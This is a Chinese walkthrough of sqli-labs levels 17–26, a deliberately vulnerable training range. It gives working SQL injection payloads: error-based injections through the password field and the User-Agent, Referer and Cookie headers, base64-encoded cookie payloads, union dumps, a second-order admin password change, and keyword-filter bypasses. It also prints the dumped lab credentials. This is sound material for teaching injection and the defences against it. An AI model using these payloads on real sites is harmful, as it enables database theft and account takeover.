总览代码全文，发现，虽然查询和更新语句我们能对更新语句（看下文）进行注入，但是，查询和更新语句的结果不会回显，说白了就是注了也白注。

但是也可以发现，代码是回给我们返回报错信息的，那我们就可以进行报错注入。

因为代码中$row和$row1一定要存在，才能进行更新语句，并且能返回报错。所以用户名一定要存在，使查询语句返回数据（用户名：DUMB），以及我们不能从查询语句注入，只能从更新语句"UPDATE users SET password = '$passwd' WHERE username='$row1'"注入，并且注入点是$passwd。
![c68209535e66d03ffc4fa98e0c57d2d4](./img/c68209535e66d03ffc4fa98e0c57d2d4.png)

很容易看出闭合是单引号`'`，更新语句注入点前不是select语句，回显位可以不用管。

放一张思维导图里面对报错注入的归整：

![80c731e1fd8d44540abade0c29412796](./img/80c731e1fd8d44540abade0c29412796.png)



+ 爆库

~~~ shell
uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))--+&submit=Submit
~~~



+ 爆表

~~~ shell
uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),0x7e))--+&submit=Submit
~~~



+ 爆列

~~~ shell
uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flag'),0x7e))--+&submit=Submit
~~~



+ 爆字段值

~~~ shell
uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select group_concat(flag4) from ctfshow.flag),0x7e))--+&submit=Submit

倒着读
uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select reverse(group_concat(flag4)) from ctfshow.flag),0x7e))--+&submit=Submit
~~~



### Level-18 UserAgent头注入

+ 首先启动<code>burpsuite</code>和打开<code>sqli-labs</code>网站第十八关

![Less-18_1](./img/Less-18_1.PNG)



+ 用账号<code>dumb</code>和密码<code>dumb</code>测试，发现页面会展示<code>ip</code>地址和<code>user-agent</code>头

![Less-18_3](./img/Less-18_3.PNG)



+ 判断闭合方式

  + 在<code>Username</code>和<code>Password</code>上注入发现会被转义，无法注入
  + 在<code>user-agent</code>上加上<code>'</code>会有报错

  ![Less-18_5](./img/Less-18_5.PNG)

  ![Less-18_6](./img/Less-18_6.PNG)

  + 而在<code>user-agent</code>上加上<code>'and '1' = '1</code>，成功闭合

  ![Less-18_7](./img/Less-18_7.PNG)

![Less-18_8](./img/Less-18_8.png)

![Less-18_9](./img/Less-18_9.PNG)



+ 爆库名

~~~ shell
两条语句均可用
' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1
~~~

![Less-18_7](./img/Less-18_7.PNG)

![Less-18_10](./img/Less-18_10.PNG)

![Less-18_11](./img/Less-18_11.PNG)

成功爆出库名<code>security</code>



+ 爆表名

~~~ shell
insert into 'security'.'某个表'(uagent,ipadd,username) values('' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1','ip地址','用户名')

'and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema =database()),0x7e),1) and '1'='1

'and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and '

'and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and '
~~~

![Less-18_12](./img/Less-18_12.PNG)

![Less-18_13](./img/Less-18_13.PNG)

![Less-18_14](./img/Less-18_14.PNG)

爆表出错，不知道什么原因



+ 爆列名

~~~ shell
'and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e)) and '
~~~

![Less-18_15](./img/Less-18_15.PNG)

![Less-18_16](./img/Less-18_16.PNG)

![Less-18_17](./img/Less-18_17.PNG)

爆列名会出现错误，不知道什么原因



+ 爆数据

~~~ shell
' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1) and '1'='1
~~~

![Less-18_18](./img/Less-18_18.PNG)

![Less-18_19](./img/Less-18_19.PNG)

![Less-18_20](./img/Less-18_20.PNG)

爆数据发生错误，不知道什么原因



### Level-19 Referer头注入

+ 首先启动<code>burpsuite</code>和打开<code>sqli-labs</code>靶场

![Less-19_1](./img/Less-19_1.PNG)



+ 输入账号<code>dumb</code>和密码<code>dumb</code>，会有<code>ip</code>地址和<code>referer</code>头

![Less-19_2](./img/Less-19_2.PNG)

![Less-19_3](./img/Less-19_3.PNG)



+ 启动<code>burpsuite</code>和开启监测端口，重新提交<code>post</code>参数，注入以下<code>payload</code>爆库名

~~~ shell
' and extractvalue(1,concat(0x7e,(select database()))) and '1'='1
~~~

![Less-19_4](./img/Less-19_4.PNG)

![Less-19_5](./img/Less-19_5.PNG)

爆出的库名是<code>security</code>



+ 爆数据表名

~~~ shell
'and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and '
~~~

![Less-19_3](./img/Less-19_3.PNG)

![Less-19_6](./img/Less-19_6.PNG)

![Less-19_7](./img/Less-19_7.PNG)



+ 爆列名

~~~ shell
'and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e)) and '
~~~

![Less-19_2](./img/Less-19_2.PNG)

![Less-19_8](./img/Less-19_8.PNG)

![Less-19_9](./img/Less-19_9.PNG)



+ 爆数据名

~~~ shell
' and extractvalue(1,concat(0x7e,(select group_concat(username,password)from users),0x7e)) and '
~~~

![Less-19_2](./img/Less-19_2.PNG)

![Less-19_10](./img/Less-19_10.PNG)

![Less-19_11](./img/Less-19_11.PNG)



### Level-20 Cookie头注入

+ 首先启动<code>burpsuite</code>和打开<code>sqli-labs</code>靶场

![Less-20_1](./img/Less-20_1.PNG)



+ 输入账号<code>admin</code>和密码<code>admin</code>，返回<code>cookie</code>头

![Less-20_2](./img/Less-20_2.PNG)

![Less-20_3](./img/Less-20_3.PNG)



+ 确定闭合方式

  + 首先用单引号<code>'</code>闭合，页面出现报错

  ~~~ shell
  '
  ~~~

  ![Less-20_4](./img/Less-20_4.PNG)

  ![Less-20_5](./img/Less-20_5.PNG)

  

  + 然后使用<code>' and '1' = '1</code>，语句正确闭合

  ![Less-20_6](./img/Less-20_6.PNG)

  ![Less-20_18](./img/Less-20_18.PNG)



+ 启动<code>burpsuite</code>和开启监测端口，重新提交<code>post</code>参数，注入以下<code>payload</code>爆库名

~~~ shell
' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1

' and extractvalue(1,concat(0x7e,(select database()),0x7e)) # 
~~~

![Less-20_8](./img/Less-20_8.PNG)

![Less-20_9](./img/Less-20_9.PNG)



![Less-20_10](./img/Less-20_10.PNG)

![Less-20_11](./img/Less-20_11.PNG)



+ 爆破数据表名

~~~ shell
' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
~~~

![Less-20_12](./img/Less-20_12.PNG)

![Less-20_13](./img/Less-20_13.PNG)



+ 爆破列名

~~~ shell
' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) #
~~~

![Less-20_14](./img/Less-20_14.PNG)

![Less-20_15](./img/Less-20_15.PNG)



+ 爆破数据

~~~ shell
' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1) #
~~~

![Less-20_16](./img/Less-20_16.PNG)

![Less-20_17](./img/Less-20_17.PNG)



### Level-21 Cookie头注入+Base64

+ 首先启动<code>burpsuite</code>和打开<code>sqli-labs</code>靶场

![Less-21_1](./img/Less-21_1.PNG)



+ 输入账号<code>admin</code>和密码<code>admin</code>，返回<code>cookie</code>头。但<code>cookie</code>却是一串奇怪的字符串，看得出来这是<code>base64</code>编码

![Less-21_3](./img/Less-21_3.PNG)

![Less-21_2](./img/Less-21_2.PNG)

<code>base64</code>解码，得到原来的变量<code>admin</code>

![Less-21_4](./img/Less-21_4.PNG)

所以21关与20关的区别主要是<code>cookie</code>头有无<code>base64</code>编码的问题



+ 爆库名

~~~ shell
admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1
~~~

<code>base64</code>编码后

~~~ shell
YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE=
~~~

![Less-21_3](./img/Less-21_3.PNG)

![Less-21_5](./img/Less-21_5.PNG)



打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据

![Less-21_6](./img/Less-21_6.PNG)



成功爆破出库名<code>security</code>

![Less-21_7](./img/Less-21_7.PNG)



+ 爆数据表名

~~~ shell
') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
~~~

<code>base64</code>编码后

~~~ shell
JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSksMHg3ZSksMSkj
~~~

![Less-21_8](./img/Less-21_8.PNG)



打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据

![Less-21_3](./img/Less-21_3.PNG)

将

~~~ shell
Cookie: uname=YWRtaW4%3D
~~~

![Less-21_16](./img/Less-21_16.PNG)

改为

~~~ shell
Cookie: uname=YWRtaW4x
~~~

![Less-21_17](./img/Less-21_17.PNG)

再添加

~~~shell
JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSksMHg3ZSksMSkj
~~~

改为

~~~ shell
Cookie: uname=YWRtaW4xJykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSksMHg3ZSksMSkj
~~~

其base64解码是

~~~ shell
admin1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
~~~

![Less-21_20](./img/Less-21_20.PNG)



成功爆破出数据表名

![Less-21_10](./img/Less-21_10.PNG)



+ 爆数据列名

~~~ shell
') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
~~~

<code>base64</code>编码后

~~~ shell
JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGFuZCB0YWJsZV9uYW1lPSd1c2VycycpLDB4N2UpLDEpIw==
~~~

![Less-21_11](./img/Less-21_11.PNG)



打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据

将

~~~ shell
Cookie: uname=YWRtaW4%3D
~~~

![Less-21_16](./img/Less-21_16.PNG)

改为

~~~ shell
Cookie: uname=YWRtaW4x
~~~

![Less-21_17](./img/Less-21_17.PNG)

再添加

~~~ shell
JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGFuZCB0YWJsZV9uYW1lPSd1c2VycycpLDB4N2UpLDEpIw==
~~~

改为

~~~ shell
Cookie: uname=YWRtaW4xJykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGFuZCB0YWJsZV9uYW1lPSd1c2VycycpLDB4N2UpLDEpIw==
~~~

其<code>base64</code>解码是

~~~ shell
admin1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
~~~

![Less-21_12](./img/Less-21_12.PNG)



成功爆出列名

![Less-21_13](./img/Less-21_13.PNG)



+ 爆数据

~~~ shell
')and updatexml  (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#
~~~

<code>base64</code>编码之后：

~~~ shell
JylhbmQgdXBkYXRleG1sICAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSkj
~~~

![Less-21_14](./img/Less-21_14.PNG)



打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据

将

~~~ shell
Cookie: uname=YWRtaW4%3D
~~~

![Less-21_16](./img/Less-21_16.PNG)

改为

~~~ shell
Cookie: uname=YWRtaW4x
~~~

![Less-21_17](./img/Less-21_17.PNG)

再添加

~~~ shell
JylhbmQgdXBkYXRleG1sICAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSkj
~~~

改为

~~~ shell
Cookie: uname=YWRtaW4xJylhbmQgdXBkYXRleG1sICAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSkj
~~~

其<code>base64</code>解码为

~~~ shell
admin1')and updatexml  (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#
~~~

![Less-21_18](./img/Less-21_18.PNG)



成功爆破数据

![Less-21_19](./img/Less-21_19.PNG)



### Level-22 Cookie头注入 + Base64编码

+ 首先打开<code>phpstudy</code>和<code>burpsuite</code>并配置好相应的设置，打开<code>sqli-labs</code>靶场到第22关

![Less-22_1](./img/Less-22_1.PNG)



+ 输入账号<code>admin</code>和密码<code>admin</code>，发现返回的<code>response</code>中的<code>Cookie</code>是<code>base64</code>编码

![Less-22_2](./img/Less-22_2.PNG)

![Less-22_4](./img/Less-22_4.PNG)

![Less-22_6](./img/Less-22_6.PNG)

![Less-22_5](./img/Less-22_5.PNG)

由此，22关与第21关基本一样，不一样的是第22关用双引号<code>"</code>闭合而第21关用单引号<code>'</code>闭合且第22关没有单括号



+ 爆库名

~~~ shell
admin" and updatexml(1,concat(0x7e,(select database()),0x7e),1) and "1"="1
~~~

<code>base64</code>编码后

~~~ shell
YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAiMSI9IjE=
~~~



打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据

![Less-22_7](./img/Less-22_7.PNG)



成功爆出数据库名<code>security</code>

![Less-22_8](./img/Less-22_8.PNG)



+ 爆数据表名

~~~ shell
" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
~~~

<code>base64</code>编码后

~~~ shell
IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSwxKSM=
~~~

打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据

将

~~~ shell
Cookie: uname=YWRtaW4%3D
~~~

![Less-22_10](./img/Less-22_10.PNG)

改为

~~~ shell
Cookie: uname=YWRtaW4x
~~~

![Less-22_11](./img/Less-22_11.PNG)

再添加

~~~ shell
IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSwxKSM=
~~~

拼接为

~~~ shell
Cookie: uname=YWRtaW4xIiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSwxKSM=
~~~

![Less-22_13](./img/Less-22_13.PNG)



放包后，顺利爆破出相应的数据表

![Less-22_14](./img/Less-22_14.PNG)



+ 爆数据列名

~~~ shell
admin1" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
~~~

<code>base64</code>编码后

~~~ shell
YWRtaW4xIiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkgYW5kIHRhYmxlX25hbWU9J3VzZXJzJyksMHg3ZSksMSkj
~~~

打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据

![Less-22_15](./img/Less-22_15.PNG)



最终成功爆破出数据列名 

![Less-22_16](./img/Less-22_16.PNG)



+ 爆破账号和密码

~~~ shell
admin1" and updatexml  (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#
~~~

经过<code>base64</code>编码后

~~~ shell
YWRtaW4xIiBhbmQgdXBkYXRleG1sICAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSkj
~~~

打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据

![Less-22_17](./img/Less-22_17.PNG)



最终爆破出数据

![Less-22_18](./img/Less-22_18.PNG)





### level23

+ 正常注入

~~~ shell
?id=1'or '1' = '1
~~~

![Less-23-1](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-1.PNG)



~~~ shell
?id=-1' union select 1,database(),version() or '1'='1
~~~

![Less-23-2](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-2.PNG)



~~~ shell
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" or '1'='1
~~~

![Less-23-3](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-3.PNG)

~~~ text
Welcome    Dhakkan
Your Login name:2
Your Password:innodb_table_stats,innodb_index_stats,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMNS_EXTENSIONS,COLUMN_STATISTICS,EVENTS,FILES,INNODB_DATAFILES,INNODB_FOREIGN,INNODB_FOREIGN_COLS,INNODB_FIELDS,INNODB_TABLESPACES_BRIEF,KEY_COLUMN_USAGE,KEYWORDS,PARAMETERS,PARTITIONS,REFERENTIAL_CONSTRAINTS,RESOURCE_GROUPS,ROUTINES,SCHEMATA,SCHEMATA_EXTENSIONS,ST_SPATIAL_REFERENCE_SYSTEMS,ST_UNITS_OF_MEASURE,ST_GEOMETRY_COLUMNS,STATISTICS,TABLE_CONSTRAINTS,TABLE_CONSTRAINTS_EXTENSIONS,TABLES,TABLES_EXTENSIONS,TABLESPACES_EXTENSIONS,TRIGGERS,VIEW_ROUTINE_USAGE,VIEW_TABLE_USAGE,VIEWS,COLUMN_PRIVILEGES,ENGINES,OPTIMIZER_TRACE,PLUGINS,PROCESSLIST,PROFILING,SCHEMA_PRIVILEGES,TABLESPACES,TABLE_PRIVILEGES,USER_PRIVILEGES,cond_instances,error_log,events_waits_current,events_waits_history,events_waits_history_long,events_waits_summary_by_host_by_event_name,events_waits_summary_by_instance,events_waits_summary_by_thread_by_event_name,events_waits_summary_by_user_by_event_name,events_wait
~~~



~~~ shell
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="FILES" or '1'='1
~~~

![Less-23-4](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-4.PNG)

~~~ text
Welcome    Dhakkan
Your Login name:2
Your Password:database_name,table_name,last_update,n_rows,clustered_index_size,sum_of_other_index_sizes,database_name,table_name,index_name,last_update,stat_name,stat_value,sample_size,stat_description,CHARACTER_SET_NAME,DEFAULT_COLLATE_NAME,DESCRIPTION,MAXLEN,CONSTRAINT_CATALOG,CONSTRAINT_SCHEMA,CONSTRAINT_NAME,CHECK_CLAUSE,COLLATION_NAME,CHARACTER_SET_NAME,ID,IS_DEFAULT,IS_COMPILED,SORTLEN,PAD_ATTRIBUTE,COLLATION_NAME,CHARACTER_SET_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,DATETIME_PRECISION,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT,GENERATION_EXPRESSION,SRS_ID,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ENGINE_ATTRIBUTE,SECONDARY_ENGINE_ATTRIBUTE,SCHEMA_NAME,TABLE_NAME,COLUMN_NAME,HISTOGRAM,EVENT_CATALOG,EVENT_SCHEMA,EVENT_NAME,DEFINER,TIME_ZONE,EVENT_BODY,EVENT_DEFINITION,EVENT_TYPE,EXECUTE_AT,INTERVAL_VALUE,INTERVAL_FIELD
~~~



+ 在这一步不知道是什么问题，无法提取数据了，并报错

~~~ shell
?id=-1' union select group_concat(database_name) from FILES or '1'='1
~~~

![Less-23-8](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-8.PNG)

~~~ text
Welcome    Dhakkan

Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in E:\phpstudy\phpstudy_pro\WWW\sqli-labs\Less-23\index.php on line 38
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or '1'='1' LIMIT 0,1' at line 1
~~~



+ 重新换一个回显位，并重复以上的三项爆破，这次成功了

~~~ shell
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="security"),3 or '1'='1
~~~

![Less-23-6](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-6.PNG)

~~~ text
Welcome    Dhakkan
Your Login name:emails,referers,uagents,users
Your Password:1
~~~



~~~ shell
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name="users" and table_schema="security"),3 or '1'='1
~~~

![Less-23-7](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-7.PNG)

~~~text
Welcome    Dhakkan
Your Login name:id,password,username
Your Password:1
~~~





~~~ shell
?id=-1' union select 1,(select group_concat(username,password) from users),3 or '1'='1
~~~

![Less-23-5](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-5.PNG)

~~~ text
Welcome    Dhakkan
Your Login name:DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupidstupidity,supermangenious,batmanmob!le,adminadmin,admin1admin1,admin2admin2,admin3admin3,dhakkandumbo,admin4admin4
Your Password:1
~~~



### level24

~~~ text
第二十四关有一个登录页面和注册页面还要一个修改密码页面，该关卡使用得是二次注入，因为登录页面和注册页面对于密码和账户名都使用mysql_real_escape_string函数对于特殊字符进行转义。这里我们利用的是注册页面，因为虽然存在函数对特殊字符进行转义，但只是在调用sql语句时候进行转义，当注册成功后账户密码存在到数据库的时候是没有转义的，以原本数据存入数据库的。当我们修改密码的时候，对于账户名是没有进行过滤的。
~~~

![09682f62c14141b5ac76ac68f0e119b3](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/09682f62c14141b5ac76ac68f0e119b3.png)

![e388adf190c942378903432e327bc822](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/e388adf190c942378903432e327bc822.png)



首先我们看到管理员账户，admin，密码是admin,但是通常情况下我们是不知道密码的，只能猜测管理员账户的admin。我们先注册一个账号名叫<code>admin'#</code>。

![bb41b4eaf6674a4c8c477764c40c51aa](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-3.PNG)



我们先注册一个账号名叫<code>admin'#</code>。可以看到我们成功将有污染的数据写入数据库。**单引号是为了和之后密码修改的用户名的单引号进行闭合，#是为了注释后面的数据。**

![Less-24-1](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-1.PNG)

![5e342978e3b54ffc963764f8deb51beb](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-4.PNG)



之后用户名admin'#和密码123456登录，进入修改密码页面。原始密码输入123456，新密码我输入的是111111，可以看到密码修改成功。

![Less-24-2](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-5.PNG)

![0a62e48c4af84c5b87204405aaaa86fa](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-6.PNG)

![e5be9e28d556404ca90911d44f4ff881](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-7.PNG)

![28a3d4e10def4be98a151bea907b8270](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/28a3d4e10def4be98a151bea907b8270.png)

当我们数据库查看的时候发现修改的是管理员的密码。而不是我们的注册账户的密码。

![ae806d5ca34d4b1990c78b1983e8a214](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-8.PNG)



### level25

![Less-25-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25-01.PNG)

第二十五关根据提示是将or和and这两替换成空，但只替换一次。大小写绕过没有用则可用双写绕过并用联合注入，information里面涉及or可以写成infoorrmation，爆表名：

~~~ shell
?id=-2' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+
~~~

![Less-25-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25-02.PNG)



爆数据列：

~~~ shell
?id=-2' union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users'--+
~~~

![Less-25-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25-03.PNG)



password中含有or，写成passwoorrd，爆数据：

~~~ shell
?id=-2' union select 1,2,group_concat(passwoorrd,id,username) from users --+
~~~

![Less-25-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25-04.PNG)



### level25a

![Less-25a-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25a-01.PNG)

同样的网站将or和and这两替换成空，但只替换一次。大小写绕过没有用则可用双写绕过并用联合注入，information里面涉及or可以写成infoorrmation，爆表名：

~~~ shell
?id=-2 union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+
~~~

![Less-25a-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25a-02.PNG)



爆数据列：

~~~ shell
?id=-2 union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users'--+
~~~

![Less-25a-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25a-03.PNG)



password中含有or，写成passwoorrd，爆数据：

~~~ shell
?id=-2 union select 1,2,group_concat(passwoorrd,id,username) from users --+
~~~

![Less-25a-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25a-04.PNG)



### level26

第二十六关将逻辑运算符，注释符以及空格过滤了，用单引号闭合，双写绕过逻辑运算符或者用&&和||替换



源码

~~~ shell
function blacklist($id)
{
    //过滤替换or
    $id= preg_replace('/or/i',"", $id);	
    //过滤替换and
    $id= preg_replace('/and/i',"", $id);	
    //过滤替换/*
    $id= preg_replace('/[\/\*]/',"", $id);
    //过滤替换--   （注释符一部分）
    $id= preg_replace('/[--]/',"", $id);	
    //过滤替换#    （注释符）
    $id= preg_replace('/[#]/',"", $id);
    //过滤替换\s      
    //\s: 匹配一个空格符 等价于【\n\r\f\v\t】
    $id= preg_replace('/[\s]/',"", $id);	
    //过滤替换 /\
    $id= preg_replace('/[\/\\\\]/',"", $id);	
    return $id;
}
~~~



常规代替空格的字符：

~~~ shell
%09 TAB 键（水平）
%0a 新建一行
%0b TAB 键（垂直）
